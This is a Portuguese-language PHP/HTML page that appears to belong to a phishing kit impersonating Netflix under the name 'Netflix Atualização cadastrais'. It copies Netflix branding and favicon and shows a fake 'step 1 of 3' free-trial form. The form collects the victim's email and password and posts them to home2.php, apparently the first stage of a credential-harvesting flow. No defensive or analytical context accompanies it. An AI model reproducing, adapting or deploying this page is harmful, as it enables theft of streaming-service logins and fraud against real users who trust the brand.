<!-- 
Theme Name: Netflix Atualização cadastrais
Author: MK(rj)
 -->
  <?php
     session_start();
 ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>Netflix</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>

</head>
<body id="tela2">
    <header id="topo">
        <div class="container-fluid">
            <div class="row">
                <div class="col-xs-6">
                    <h1 class="logo">
                        <img src="img/logo.png">
                    </h1>
                </div>
                <div class="col-xs-6">
                    <!-- <span class="btn-entrar">Entrar</span> -->
                </div>
            </div>
        </div>
    </header>
    <section class="captaemail">
        <div class="container">
            <div class="passos-topo">
                <p>PASSOS <strong>1</strong> DE <strong>3</strong><br>
                <span><strong>Assista um mês grátis</strong></span></p>
                <p>Faltam 3 passos!<br>
                Nós também detestamos formulários.</p>
                <!-- <span>Crie sua conta.</span> -->
            </div>
            <form action="home2.php" method="POST" name="form1">
                <div class="form-group">
                    <input id="email" name="email" placeholder="Email" type="email" minlength="11" required>
                </div>
                <div class="form-group">
                    <input id="senha" name="senha" placeholder="Senha" type="password" minlength="6" required>
                </div>
                <div class="form-group">
                    <input type="submit" name="" value="Continuar">
                </div>
            </form>
        </div>
    </section>
</body>
</html>